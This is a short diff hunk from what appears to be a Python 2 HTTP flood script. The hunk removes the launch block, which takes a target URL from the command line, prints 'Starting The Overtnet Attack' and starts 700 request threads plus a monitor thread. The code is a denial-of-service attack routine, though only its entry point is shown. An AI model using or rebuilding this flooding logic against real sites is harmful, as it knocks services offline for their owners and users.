@@ -3487,19 +3487,3 @@ class MonitorThread(threading.Thread):
 			print "\n-- Sending a super amount of packets"
 
 
-		print "                       -->Starting The Overtnet Attack<--"
-		if len(sys.argv)== 3:
-			if sys.argv[2]=="safe":
-				set_safe()
-		url = sys.argv[1]
-		if url.count("/")==2:
-			url = url + "/"
-		m = re.search('http\://([^/]*)/?.*', url)
-		host = m.group(1)
-		for i in range(700):
-			t = HTTPThread()
-			t.start()
-		t = MonitorThread()
-		t.start()
-
-	
